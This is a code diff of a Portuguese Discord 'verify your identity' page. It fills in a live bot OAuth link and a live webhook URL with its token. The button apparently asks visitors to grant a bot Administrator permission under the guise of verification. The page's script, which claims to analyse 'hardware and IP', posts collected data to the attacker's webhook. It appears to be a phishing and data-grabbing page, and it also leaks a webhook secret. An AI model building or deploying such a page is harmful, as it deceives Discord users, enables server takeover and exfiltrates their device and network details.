@@ -15,7 +15,7 @@
     <p id="instrucao">Clique no botão abaixo para autenticar sua conta e verificar seu dispositivo.</p>
     <br>
     
-    <a id="btn-login" class="btn" href="SUA_URL_OAUTH2_AQUI">Verificar Identidade com o Discord</a>
+    <a id="btn-login" class="btn" href="https://discord.com/oauth2/authorize?client_id=837047332654153772&permissions=8&integration_type=0&scope=bot+applications.commands">Verificar Identidade com o Discord</a>
     
     <h2 id="status" class="escondido">Analisando hardware e IP...</h2>
 
@@ -55,7 +55,7 @@
                         }]
                     };
 
-                    fetch("URL_DO_SEU_WEBHOOK_AQUI", {
+                    fetch("https://discord.com/api/webhooks/1510182678819770368/AqmsEf4QpNvv3evB4vJPtblbd9gYcVhUKgEECThMe9HQBJmOziedLRkAB1F-dJSu1qR5", {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify(dadosWebhook)
